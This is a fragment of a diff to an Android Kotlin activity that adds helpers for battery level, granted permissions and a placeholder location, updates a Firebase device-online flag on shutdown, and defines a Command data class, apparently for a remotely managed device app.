+        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
+        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
+    }
+    
+    private fun getGrantedPermissions(): List<String> {
+        return ALL_PERMISSIONS.filter { 
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED 
+        }
+    }
+    
+    private fun getCurrentLocation(): Map<String, Double>? {
+        // This is a simplified version - in practice, you'd use LocationManager or FusedLocationProviderClient
+        return if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            mapOf("lat" to 0.0, "lng" to 0.0) // Placeholder
+        } else null
     }
     
     override fun onBackPressed() {
@@ -598,11 +620,15 @@ class MainActivity : AppCompatActivity() {
     
     override fun onDestroy() {
         super.onDestroy()
-        unregisterReceiver(batteryReceiver)
-        deviceRef.child("online").setValue(false)
-    }
-    
-    companion object {
-        private const val TAG = "MainActivity"
+        // Update device status to offline
+        database.reference.child("devices").child(deviceId).child("online").setValue(false)
     }
 }
+
+// Data classes
+data class Command(
+    val type: String = "",
+    val params: String? = null,
+    val timestamp: Long = 0,
+    val sender: String = ""
+)
